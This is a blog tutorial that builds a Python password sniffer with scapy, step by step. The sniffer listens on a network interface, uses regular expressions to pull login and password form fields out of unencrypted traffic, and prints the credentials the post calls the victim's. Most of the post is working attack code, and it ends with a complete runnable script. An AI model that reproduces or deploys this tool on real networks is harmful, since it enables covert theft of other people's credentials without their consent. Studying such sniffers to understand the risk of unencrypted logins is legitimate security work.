---
title: Writing a password sniffer using python
date: 2020-12-19 08:58:58 GMT+2
categories: [Development, Pentesting Tools]
tags: [ethical hacking, python]     # TAG names should always be lowercase
image: /assets/img/posts/passwordsniffer/passwordsniffer.jpg
---

## What is password sniffer ?
A password sniffer is a software application that scans and records passwords that are used or broadcasted on a computer or network interface. It listens to all incoming and outgoing network traffic and records any instance of a data packet that contains a password.

## Writing the script

### Step 1: Importing required modules
* scapy: Scapy is a powerful Python-based interactive packet manipulation program and library. It is able to forge or decode packets of a wide number of protocols, send them on the wire, capture them, store or read them using pcap files, match requests and replies, and much more.
* urllib (parse): Urllib module is the URL handling module for python. It is used to fetch URLs (Uniform Resource Locators). It uses the urlopen function and is able to fetch URLs using a variety of different protocols. Urllib is a package that collects several modules for working with URLs, such as parse for parsing URLs.
* re: A regular expression (or RE) specifies a set of strings that matches it; the functions in this module let you check if a particular string matches a given regular expression (or if a given regular expression matches a particular string, which comes down to the same thing).

```python
# Python code snippet
from scapy.all import *
from scapy.layers.inet import TCP, IP
from urllib import parse
import re
```

## Step 2: Implementing required functions
### pkt_parser() function
This function filters the sniffed packets to get the packets that might contain the username and password. We search for tha packets that has TCP, Raw, and IP layer. If that packet is what we are looking for, then we store the body (or payload) of that packet and pass it as a parameter to get_login_pass() function that we will implement later. user_pass variable contains the returned value (user and passwd ) of get_login_pass() function; therefore, we check if that variable is not equal to none, then we print the payload itself to know which website the victim use and we print the username and password that the victim entered. If the sniffed packet is not that one we are looking for, then we just pass and let that packet go since it probably does not contain any username or any password.

```python
#Python code snippet
def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        user_pass = get_login_pass(body)
        if user_pass != None:
            print(packet[TCP].payload)
            print(parse.unquote(user_pass[0]))
            print(parse.unquote(user_pass[1]))
    else:
          pass
```

### get_login_pass() function
In this function, we define user and passwd variables with a default value "None" and we define userfields and passfields with a list. Then, we iterate over each list and use regex to compare the data that we found at the payload to our defined regex pattern. If we found matches, then we store the found username and password. And at the end of the function, we return both value the username and password.

```python
#Python code snippet
def get_login_pass(body):

    user = None
    passwd = None

    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']

    for login in userfields:
        login_re = re.search('(%s=[^&\']+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()
    for passfield in passfields:
        pass_re = re.search('(%s=[^&\']+)' % passfield, body, re.IGNORECASE)
        if pass_re:
            passwd = pass_re.group()

    if user and passwd:
        return(user,passwd)
```

## Step 4: The script start point
When we run the script, the code starts from here. We define an interface variable "iface" with value "eth0" which is the interface that we will use to sniff the packets on the network. Then, we use sniff function which is a predefined function in scapy module to start sniffing packets on the network. Also, we handle the KeyboardInterrupt exception, so we can terminate the program from keyboard safely.

```python
#Python snippet code
iface = "eth0"
try:
    sniff(iface=iface, prn=pkt_parser, store=0)
except KeyboardInterrupt:
    print('Exiting')
    exit(0)
```

## The complete script
After assembling all the steps together, here is our script.

```python
from scapy.all import *
from scapy.layers.inet import TCP, IP
from urllib import parse
import re

iface = "eth0"

def get_login_pass(body):

    user = None
    passwd = None

    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']

    for login in userfields:
        login_re = re.search('(%s=[^&\']+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()
    for passfield in passfields:
        pass_re = re.search('(%s=[^&\']+)' % passfield, body, re.IGNORECASE)
        if pass_re:
            passwd = pass_re.group()

    if user and passwd:
        return(user,passwd)


def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        user_pass = get_login_pass(body)
        if user_pass != None:
            print(packet[TCP].payload)
            print(parse.unquote(user_pass[0]))
            print(parse.unquote(user_pass[1]))
    else:
          pass



try:
    sniff(iface=iface, prn=pkt_parser, store=0)
except KeyboardInterrupt:
    print('Exiting')
    exit(0)
```

## Script output
And at the end, here is our script output as depicted below.

![script_output](/assets/img/posts/passwordsniffer/script_output.png)
